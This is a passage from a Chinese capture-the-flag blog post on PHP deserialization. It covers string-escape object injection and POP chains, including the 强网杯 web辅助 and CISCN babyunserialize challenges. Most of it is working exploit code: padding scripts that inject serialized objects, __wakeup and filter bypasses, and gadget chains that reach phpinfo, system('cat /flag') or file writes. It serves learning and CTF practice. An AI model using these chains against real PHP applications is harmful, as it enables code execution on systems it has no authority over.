class="hljs-string">&quot;./flag&quot;</span>;    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">CURL</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;    <span class="hljs-variable">$ch</span> = curl_init();    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="hljs-literal">FALSE</span>);    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="hljs-literal">FALSE</span>);    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);    <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);    curl_close(<span class="hljs-variable">$ch</span>);    <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">padding</span>(<span class="hljs-params"><span class="hljs-variable">$poc</span></span>)</span>&#123;    <span class="hljs-variable">$target</span> = <span class="hljs-string">&#x27;&quot;;s:8:&quot;password&quot;;s:72:&quot;1&#x27;</span>;    <span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;drom&quot;</span>.str_repeat(<span class="hljs-string">&#x27;\0\0\0&#x27;</span>,strlen(<span class="hljs-variable">$target</span>)/<span class="hljs-number">3</span>);    <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;1&#x27;</span>.<span class="hljs-string">&#x27;&quot;;s:4:&quot;drom&quot;;&#x27;</span>.<span class="hljs-variable">$poc</span>.<span class="hljs-string">&#x27;&#125;&#x27;</span>;  <span class="hljs-comment">//注入一个名称为drom对象，内容为pop链</span><span class="hljs-comment">//    echo $username,&quot;\n&quot;;</span><span class="hljs-comment">//    echo $password,&quot;\n&quot;;</span>    <span class="hljs-variable">$args</span> = <span class="hljs-string">&#x27;?a=&#x27;</span>.urlencode(<span class="hljs-variable">$username</span>).<span class="hljs-string">&#x27;&amp;b=&#x27;</span>.urlencode(<span class="hljs-variable">$password</span>);    <span class="hljs-keyword">return</span> <span class="hljs-variable">$args</span>;&#125;<span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> B();<span class="hljs-variable">$b</span>-&gt;b = <span class="hljs-keyword">new</span> C();<span class="hljs-keyword">echo</span> CURL(<span class="hljs-string">&#x27;http://127.0.0.1/ax/index.php&#x27;</span>.padding(serialize(<span class="hljs-variable">$b</span>)));</code></pre></div><h3 id="加了绕过：强网杯web辅助"><a href="#加了绕过：强网杯web辅助" class="headerlink" title="加了绕过：强网杯web辅助"></a>加了绕过：强网杯web辅助</h3><p><strong>class.php</strong></p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">player</span></span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$user</span>;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$pass</span>;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$admin</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span>, <span class="hljs-variable">$admin</span> = <span class="hljs-number">0</span></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;user = <span class="hljs-variable">$user</span>;        <span class="hljs-keyword">$this</span>-&gt;pass = <span class="hljs-variable">$pass</span>;        <span class="hljs-keyword">$this</span>-&gt;admin = <span class="hljs-variable">$admin</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_admin</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;admin;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">topsolo</span></span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$name</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;Riven&#x27;</span></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">TP</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span> (gettype(<span class="hljs-keyword">$this</span>-&gt;name) === <span class="hljs-string">&quot;function&quot;</span> <span class="hljs-keyword">or</span> gettype(<span class="hljs-keyword">$this</span>-&gt;name) === <span class="hljs-string">&quot;object&quot;</span>)&#123;            <span class="hljs-variable">$name</span> = <span class="hljs-keyword">$this</span>-&gt;name;            <span class="hljs-variable">$name</span>();        &#125;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;TP();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">midsolo</span></span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$name</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;name !== <span class="hljs-string">&#x27;Yasuo&#x27;</span>)&#123;            <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-string">&#x27;Yasuo&#x27;</span>;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No Yasuo! No Soul!\n&quot;</span>;        &#125;    &#125;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;Gank();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Gank</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span> (stristr(<span class="hljs-keyword">$this</span>-&gt;name, <span class="hljs-string">&#x27;Yasuo&#x27;</span>))&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Are you orphan?\n&quot;</span>;        &#125;        <span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Must Be Yasuo!\n&quot;</span>;        &#125;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">jungle</span></span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;Lee Sin&quot;</span></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">KS</span>(<span class="hljs-params"></span>)</span>&#123;        system(<span class="hljs-string">&quot;cat /flag&quot;</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;KS();          <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;      &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p><strong>common.php</strong></p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;    <span class="hljs-variable">$data</span> = str_replace(<span class="hljs-string">&#x27;\0*\0&#x27;</span>, chr(<span class="hljs-number">0</span>).<span class="hljs-string">&quot;*&quot;</span>.chr(<span class="hljs-number">0</span>), <span class="hljs-variable">$data</span>);    <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;    <span class="hljs-variable">$data</span> = str_replace(chr(<span class="hljs-number">0</span>).<span class="hljs-string">&quot;*&quot;</span>.chr(<span class="hljs-number">0</span>), <span class="hljs-string">&#x27;\0*\0&#x27;</span>, <span class="hljs-variable">$data</span>);    <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">if</span>(stristr(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;name&#x27;</span>)!==<span class="hljs-literal">False</span>)&#123;        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Name Pass\n&quot;</span>);    &#125;    <span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><ul><li>pop链中的变量都变成了protected，反序列化时需格外注意。</li><li>read函数有变化，字符是从5个减小到3个。</li><li>绕过对于name的过滤，可以使用十六进制，然后使用S进行转义处理。否则无法正确处理十六进制</li><li>绕过__wakeup。</li></ul><p><strong>利用脚本</strong></p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">player</span></span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$user</span>;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$pass</span>;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$admin</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$user</span>, <span class="hljs-variable">$pass</span>, <span class="hljs-variable">$admin</span> = <span class="hljs-number">0</span></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;user = <span class="hljs-variable">$user</span>;        <span class="hljs-keyword">$this</span>-&gt;pass = <span class="hljs-variable">$pass</span>;        <span class="hljs-keyword">$this</span>-&gt;admin = <span class="hljs-variable">$admin</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">topsolo</span></span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$name</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;Riven&#x27;</span></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">midsolo</span></span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$name</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">jungle</span></span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;Lee Sin&quot;</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;    &#125;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">console</span>(<span class="hljs-params"><span class="hljs-variable">$line</span></span>)</span>&#123;    <span class="hljs-variable">$arr</span> = explode(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-variable">$line</span>);    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;sizeof(<span class="hljs-variable">$arr</span>);<span class="hljs-variable">$i</span>++)&#123;        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/name/&#x27;</span>,<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>]))&#123;            <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>] = str_replace(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&#x27;\6e\61\6d\65&#x27;</span>,<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>]);            <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span><span class="hljs-number">-2</span>] = str_replace(<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span><span class="hljs-number">-2</span>]);        &#125;    &#125;    <span class="hljs-variable">$result</span> = implode(<span class="hljs-variable">$arr</span>,<span class="hljs-string">&#x27;:&#x27;</span>);    <span class="hljs-variable">$result</span> = str_replace(<span class="hljs-string">&#x27;&quot;midsolo&quot;:1:&#x27;</span>,<span class="hljs-string">&#x27;&quot;midsolo&quot;:2:&#x27;</span>,<span class="hljs-variable">$result</span>);    <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pad</span>(<span class="hljs-params"><span class="hljs-variable">$poc</span></span>)</span>&#123;    <span class="hljs-variable">$pad</span> = <span class="hljs-string">&#x27;&quot;;s:7:&quot; * pass&quot;;s:111:&quot;0&#x27;</span>;    <span class="hljs-variable">$username</span> = <span class="hljs-string">&#x27;drom&#x27;</span>.str_repeat(<span class="hljs-string">&#x27;\0*\0&#x27;</span>,(strlen(<span class="hljs-variable">$pad</span>))/<span class="hljs-number">2</span>);    <span class="hljs-variable">$password</span> = <span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-string">&#x27;&quot;;s:4:&quot;drom&quot;;&#x27;</span>.<span class="hljs-variable">$poc</span>.<span class="hljs-string">&#x27;s:8:&quot;\0*\0admin&quot;;i:0;&#125;&#x27;</span>;    <span class="hljs-variable">$args</span> = <span class="hljs-string">&#x27;?username=&#x27;</span>.urlencode(<span class="hljs-variable">$username</span>).<span class="hljs-string">&#x27;&amp;password=&#x27;</span>.urlencode(<span class="hljs-variable">$password</span>);    <span class="hljs-keyword">return</span> <span class="hljs-variable">$args</span>;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">CURL</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>)</span>&#123;    <span class="hljs-variable">$ch</span> = curl_init();    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span class="hljs-literal">FALSE</span>);    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span class="hljs-literal">FALSE</span>);    curl_setopt(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);    <span class="hljs-variable">$output</span> = curl_exec(<span class="hljs-variable">$ch</span>);    curl_close(<span class="hljs-variable">$ch</span>);    <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>;&#125;<span class="hljs-variable">$tmp</span>  = console(serialize(<span class="hljs-keyword">new</span> topsolo(<span class="hljs-keyword">new</span> midsolo(<span class="hljs-keyword">new</span> jungle()))));<span class="hljs-variable">$url</span> = <span class="hljs-string">&#x27;http://127.0.0.1/qw/webfuzhu/html/&#x27;</span>;CURL(<span class="hljs-variable">$url</span>.pad(<span class="hljs-variable">$tmp</span>));<span class="hljs-keyword">echo</span> CURL(<span class="hljs-variable">$url</span>.<span class="hljs-string">&#x27;play.php&#x27;</span>);</code></pre></div><h3 id="由短变长：0ctf2016piapiapia"><a href="#由短变长：0ctf2016piapiapia" class="headerlink" title="由短变长：0ctf2016piapiapia"></a>由短变长：0ctf2016piapiapia</h3><ul><li>由短变长：将payload连接到前面的字段，使其覆盖到后面的字段。</li><li>由长变短：将payload连接到后面的字段，使其往前覆盖</li></ul><h2 id="0x04-php反序列化POP链"><a href="#0x04-php反序列化POP链" class="headerlink" title="0x04 php反序列化POP链"></a>0x04 php反序列化POP链</h2><h3 id="方法列表-1"><a href="#方法列表-1" class="headerlink" title="方法列表"></a>方法列表</h3><div class="hljs code-wrapper"><pre><code class="hljs php">起点：__destruct() <span class="hljs-comment">//对象被销毁时触发</span>__wakeup() <span class="hljs-comment">//unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。</span>__toString() <span class="hljs-comment">//__toString() 方法用于一个类被当成字符串时应怎样回应</span>   中间跳板：__call() <span class="hljs-comment">//在对象上下文中调用不可访问的方法时触发</span>__callStatic() <span class="hljs-comment">//在静态上下文中调用不可访问的方法时触发</span>__get() <span class="hljs-comment">//用于从不可访问的属性读取数据</span>__set() <span class="hljs-comment">//用于将数据写入不可访问的属性</span>__isset() <span class="hljs-comment">//在不可访问的属性上调用isset()或empty()触发</span>__unset() <span class="hljs-comment">//在不可访问的属性上使用unset()时触发</span>__invoke() <span class="hljs-comment">//当脚本尝试将对象调用为函数时触发</span>__toString() <span class="hljs-comment">//</span>终点：__call: 调用不可访问或不存在的方法时被调用call_user_func、call_user_func_array等代码执行点    其他：__construct()<span class="hljs-comment">//创建对象时触发0</span>__sleep() <span class="hljs-comment">//对象被序列化之前触发</span></code></pre></div><h3 id="CISCN：babyunserialize"><a href="#CISCN：babyunserialize" class="headerlink" title="CISCN：babyunserialize"></a>CISCN：babyunserialize</h3><ul><li><a href="https://blog.csdn.net/qq_42697109/article/details/108212765">CISCN2020初赛 writeup web部分</a></li></ul><p><strong>payload</strong></p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">namespace</span> <span class="hljs-title">CLI</span>&#123;    <span class="hljs-title">class</span> <span class="hljs-title">Agent</span>    &#123;        <span class="hljs-title">protected</span> $<span class="hljs-title">server</span>;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$server</span></span>)</span><span class="hljs-function">        </span>&#123;            <span class="hljs-keyword">$this</span>-&gt;server=<span class="hljs-variable">$server</span>;        &#125;    &#125;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">WS</span></span><span class="hljs-class">    </span>&#123;    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">DB</span>&#123;    <span class="hljs-title">abstract</span> <span class="hljs-title">class</span> <span class="hljs-title">Cursor</span>  <span class="hljs-title">implements</span> \<span class="hljs-title">IteratorAggregate</span> &#123;&#125;    <span class="hljs-title">class</span> <span class="hljs-title">Mongo</span> &#123;        <span class="hljs-title">public</span> $<span class="hljs-title">events</span>;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$events</span></span>)</span><span class="hljs-function">        </span>&#123;            <span class="hljs-keyword">$this</span>-&gt;events=<span class="hljs-variable">$events</span>;        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">DB</span>\<span class="hljs-title">Jig</span>&#123;    <span class="hljs-title">class</span> <span class="hljs-title">Mapper</span> <span class="hljs-title">extends</span> \<span class="hljs-title">DB</span>\<span class="hljs-title">Cursor</span> &#123;        <span class="hljs-title">protected</span> $<span class="hljs-title">legacy</span>=0;        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$db</span>;        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$file</span>;        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$db</span>,<span class="hljs-variable">$file</span></span>)</span>&#123;            <span class="hljs-keyword">$this</span>-&gt;db=<span class="hljs-variable">$db</span>;            <span class="hljs-keyword">$this</span>-&gt;file=<span class="hljs-variable">$file</span>;        &#125;    &#125;&#125;<span class="hljs-keyword">namespace</span> <span class="hljs-title">DB</span>\<span class="hljs-title">SQL</span>&#123;    <span class="hljs-title">class</span> <span class="hljs-title">Mapper</span> <span class="hljs-title">extends</span> \<span class="hljs-title">DB</span>\<span class="hljs-title">Cursor</span>&#123;        <span class="hljs-title">protected</span> $<span class="hljs-title">props</span>=[&quot;<span class="hljs-title">read</span>&quot;=&gt;&quot;<span class="hljs-title">phpinfo</span>&quot;];    &#125;&#125;<span class="hljs-keyword">namespace</span>&#123;    $<span class="hljs-title">SQLMapper</span>=<span class="hljs-title">new</span> <span class="hljs-title">DB</span>\<span class="hljs-title">SQL</span>\<span class="hljs-title">Mapper</span>();<span class="hljs-comment">//    echo serialize($SQLMapper),&quot;\n&quot;;</span>    <span class="hljs-variable">$JigMapper</span>=<span class="hljs-keyword">new</span> DB\Jig\Mapper(<span class="hljs-variable">$SQLMapper</span>,INFO_ALL );<span class="hljs-comment">//    $MongoMapper  = new CLI\WS();</span>    <span class="hljs-variable">$DBMongo</span>=<span class="hljs-keyword">new</span> DB\Mongo(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;disconnect&#x27;</span>=&gt;<span class="hljs-keyword">array</span>(<span class="hljs-variable">$JigMapper</span>,<span class="hljs-string">&quot;update&quot;</span>)));    <span class="hljs-variable">$Agent</span>=<span class="hljs-keyword">new</span> CLI\Agent(<span class="hljs-variable">$DBMongo</span>);    <span class="hljs-variable">$WS</span>=<span class="hljs-keyword">new</span> CLI\WS();    <span class="hljs-keyword">echo</span> urlencode(serialize(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$WS</span>,<span class="hljs-variable">$Agent</span>)));&#125;</code></pre></div><h3 id="l3m0n-pop链学习"><a href="#l3m0n-pop链学习" class="headerlink" title="l3m0n pop链学习"></a><a href="https://www.cnblogs.com/iamstudy/">l3m0n</a> pop链学习</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OutputFilter</span> </span>&#123;  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$matchPattern</span>;  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$replacement</span>;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$repl</span></span>) </span>&#123;    <span class="hljs-keyword">$this</span>-&gt;matchPattern = <span class="hljs-variable">$pattern</span>;    <span class="hljs-keyword">$this</span>-&gt;replacement = <span class="hljs-variable">$repl</span>;  &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>) </span>&#123;    <span class="hljs-keyword">return</span> preg_replace(<span class="hljs-keyword">$this</span>-&gt;matchPattern, <span class="hljs-keyword">$this</span>-&gt;replacement, <span class="hljs-variable">$data</span>);  &#125;&#125;;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogFileFormat</span> </span>&#123;  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filters</span>;  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$endl</span>;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filters</span>, <span class="hljs-variable">$endl</span></span>) </span>&#123;    <span class="hljs-keyword">$this</span>-&gt;filters = <span class="hljs-variable">$filters</span>;    <span class="hljs-keyword">$this</span>-&gt;endl = <span class="hljs-variable">$endl</span>;  &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">format</span>(<span class="hljs-params"><span class="hljs-variable">$txt</span></span>) </span>&#123;    <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;filters <span class="hljs-keyword">as</span> <span class="hljs-variable">$filter</span>) &#123;      <span class="hljs-variable">$txt</span> = <span class="hljs-variable">$filter</span>-&gt;filter(<span class="hljs-variable">$txt</span>);    &#125;    <span class="hljs-variable">$txt</span> = str_replace(<span class="hljs-string">&#x27;\n&#x27;</span>, <span class="hljs-keyword">$this</span>-&gt;endl, <span class="hljs-variable">$txt</span>);    <span class="hljs-keyword">return</span> <span class="hljs-variable">$txt</span>;  &#125;&#125;;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LogWriter_File</span> </span>&#123;  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$format</span>;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$format</span></span>) </span>&#123;    <span class="hljs-keyword">$this</span>-&gt;filename = str_replace(<span class="hljs-string">&quot;..&quot;</span>, <span class="hljs-string">&quot;__&quot;</span>, str_replace(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&quot;_&quot;</span>, <span class="hljs-variable">$filename</span>));    <span class="hljs-keyword">$this</span>-&gt;format = <span class="hljs-variable">$format</span>;  &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">writeLog</span>(<span class="hljs-params"><span class="hljs-variable">$txt</span></span>) </span>&#123;    <span class="hljs-variable">$txt</span> = <span class="hljs-keyword">$this</span>-&gt;format-&gt;format(<span class="hljs-variable">$txt</span>);    <span class="hljs-comment">//<span class="hljs-doctag">TODO:</span> Modify the address here, and delete this TODO.</span>    file_put_contents(<span class="hljs-string">&quot;E:\\WWW\\test\\ctf&quot;</span> . <span class="hljs-keyword">$this</span>-&gt;filename, <span class="hljs-variable">$txt</span>, FILE_APPEND);  &#125;&#125;;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Logger</span> </span>&#123;  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$logwriter</span>;<span class="hljs-comment">//这里装入LogWriter_File对象</span>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$writer</span></span>) </span>&#123;    <span class="hljs-keyword">$this</span>-&gt;logwriter = <span class="hljs-variable">$writer</span>;  &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">log</span>(<span class="hljs-params"><span class="hljs-variable">$txt</span></span>) </span>&#123;<span class="hljs-comment">//这里偷梁换柱Song的log</span>    <span class="hljs-keyword">$this</span>-&gt;logwriter-&gt;writeLog(<span class="hljs-variable">$txt</span>);  &#125;&#125;;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Song</span> </span>&#123;  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$logger</span>;  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$name</span>;  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$group</span>;  <span class="hljs-keyword">protected</span> <span class="hljs-variable">$url</span>;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$group</span>, <span class="hljs-variable">$url</span></span>) </span>&#123;    <span class="hljs-keyword">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;    <span class="hljs-keyword">$this</span>-&gt;group = <span class="hljs-variable">$group</span>;    <span class="hljs-keyword">$this</span>-&gt;url = <span class="hljs-variable">$url</span>;    <span class="hljs-variable">$fltr</span> = <span class="hljs-keyword">new</span> OutputFilter(<span class="hljs-string">&quot;/\[i\](.*)\[\/i\]/i&quot;</span>, <span class="hljs-string">&quot;&lt;i&gt;\\1&lt;/i&gt;&quot;</span>);    <span class="hljs-keyword">$this</span>-&gt;logger = <span class="hljs-keyword">new</span> Logger(<span class="hljs-keyword">new</span> LogWriter_File(<span class="hljs-string">&quot;song_views&quot;</span>, <span class="hljs-keyword">new</span> LogFileFormat(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$fltr</span>), <span class="hljs-string">&quot;\n&quot;</span>)));  &#125;  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;a href=&#x27;&quot;</span> 